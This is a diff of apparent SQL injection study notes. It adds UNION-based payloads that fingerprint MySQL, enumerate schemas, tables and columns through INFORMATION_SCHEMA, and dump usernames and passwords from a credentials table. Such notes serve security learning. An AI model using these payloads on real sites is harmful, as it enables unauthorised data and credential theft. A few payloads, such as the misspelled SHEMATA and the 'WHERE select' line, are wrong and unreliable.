@@ -136,10 +136,56 @@ cn' UNION select 1,2,3,4--
 It is very common that not all columns are displayed to the user.  
 Very important to figure out which columns are displayed so you know where to put your injection to get it displayed  
 For example, the "id" field is often used to link to other tables, but is almost never displayed to the user  
-To Find out, use numbers as your junk data, so you can see which numbers are displayed easily  
+To find out, use numbers as your junk data, so you can see which numbers are displayed easily  
 ```sql
 # Assuming column 1 is not displayed to the end user
 cn' UNION select 1,@@version,3,4-- 
+```
+## DB Enumeration
+### MySQL
+We need to know what flavor of SQL to craft our querys. (Ex: MySQL, MSSQL, etc)
+Good guesses: Webserver is IIS, probably MSSQL. If Webserver is NGINX or Apache, probably MySQL.
+```sql
+# MySQL
+SELECT @@version # Useful for when we have full query output. Will return with MSSQL & MySQL, but errors with others
+SELECT POW(1,1) # Useful for when we only have numeric output. Only works with MySQL
+SELECT SLEEP(5) # Blind/No Output. Delays page response by 5 seconds. Only works with MySQL
+```
+### INFORMATION_SCHEMA Db
+To pull data, we need a list of db's, list of tables within each db, list of columns in each table
+Use the dot (.) operator to reference a table in another db
+```sql
+SELECT * FROM my_database.user;
+# Selects all from table user in my_database db
+```
+### SCHEMATA
+Enumerate which db's are available
+The table SCHEMATA in the INFORMATION_SCHEMA db contains the info about all db's on the server
+```sql
+# Direct query, not an injection
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SHEMATA;
+# Injection
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--  
+# Find the current db the webapp is using. Use "database()" query
+cn' UNION select 1, database(),2,3-- 
+```
+### Tables
+To get a list of tables, use TABLES table in the INFORMATION_SCHEMA db
+```sql
+cn' WHERE select 1, TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='users'-- 
+# Selects TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where the table table_schema = users.
+```
+### Columns
+Column names can be found in the COLUMNS table in the INFORMATION_SCHEMA db
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+# Selects column name, table name, and table schema from columns table in information_schema db where the
+# table name is credentials
+```
+### Data
+From the above info, we can now craft our query.
+```sql
+cn' UNION select 1, username, password, 4 from users.credentials--
 ```
 ## In-Band
 ### Summary
